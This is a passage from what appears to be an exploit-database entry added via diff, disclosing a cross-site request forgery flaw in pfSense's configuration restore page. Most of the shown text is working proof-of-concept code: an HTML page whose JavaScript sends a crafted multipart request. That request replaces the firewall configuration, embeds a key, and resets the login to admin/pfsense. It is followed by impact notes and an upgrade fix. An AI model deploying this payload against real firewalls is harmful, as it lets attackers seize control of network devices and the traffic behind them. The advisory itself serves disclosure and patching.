lOdCsrQWcwSmJHOUJTZ3BGVGYrK1I1MHh4cU5wU2g0aTYzNHl6eTJmSU5ybDY4akwKakpVajJMRHJ6WWNBSDFIN0lCdTVWYXZVQjFsY3lVdGF4ZS9GZGh3WENRS0JnUURDMlJvN0ZETFNqYlI1RDYyVgoxSkgzVFV1Z2ZiRmliQllRazYrMit6eHVjeTN4V3B1UnBWYVRqSGJvS3N6S2NTS09UK251cWJ4YS9Fbmh0VFZlClc1WnJGMlM3VkpPcERZVEwyZkR0VmJZZ0xJUmp5d0JKM3lUTmFoWmxUZ0FVKzM1MGgvV0NEcnVHMXVqZnJOVzAKZ3pFeU9nRSt3UWNMSi8rNmNHZjk1Mmg4b2c9PQotLS0tLUVORCBQUklWQVRFIEtFWS0tLS0tCg==\x3c/prv\x3e\n" + 
+          "\t\x3c/cert\x3e\n" + 
+          "\t\x3cppps/\x3e\n" + 
+          "\x3c/pfsense\x3e\n" + 
+          "\r\n" + 
+          "-----------------------------8271879791886716022292650152\r\n" + 
+          "Content-Disposition: form-data; name=\"decrypt_password\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------8271879791886716022292650152\r\n" + 
+          "Content-Disposition: form-data; name=\"decrypt_passconf\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------8271879791886716022292650152\r\n" + 
+          "Content-Disposition: form-data; name=\"Submit\"\r\n" + 
+          "\r\n" + 
+          "Restore configuration\r\n" + 
+          "-----------------------------8271879791886716022292650152--\r\n";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+    </script>
+    <form action="#">
+      <input type="button" value="Submit request" onclick="submitRequest();" />
+    </form>
+  </body>
+</html>
+
+<!--
+
+--End of POC--
+Firewall will restart and the Firewall config changes will take place as specified by us in our POC.
+Note: Username and Password after POC is run are: admin and pfsense respectively.
+
+3. Impact
+
+On diag_backup.php, the firewall configuration could be altered or replaced if the administrator could be tricked into loading a specially crafted page while
+also logged into the firewall with the same browser session.
+
+4. Solution:
+   
+Update to version 2.2.6
+https://www.pfsense.org/download/
+
+-->
